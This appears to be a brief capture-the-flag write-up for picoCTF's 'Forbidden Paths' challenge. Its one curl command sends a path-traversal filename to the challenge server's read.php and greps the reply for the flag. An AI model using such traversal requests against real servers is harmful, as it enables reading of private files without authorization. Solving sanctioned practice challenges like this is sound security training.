# Forbidden Paths

We can't use absolute paths, but we can explore relative ones:

``` console
$ curl \
        --silent \
        --request POST \
        --data 'filename=../../../../flag.txt' \
        'http://saturn.picoctf.net:50561/read.php' \
        | grep --only-matching 'picoCTF{.*}'
```
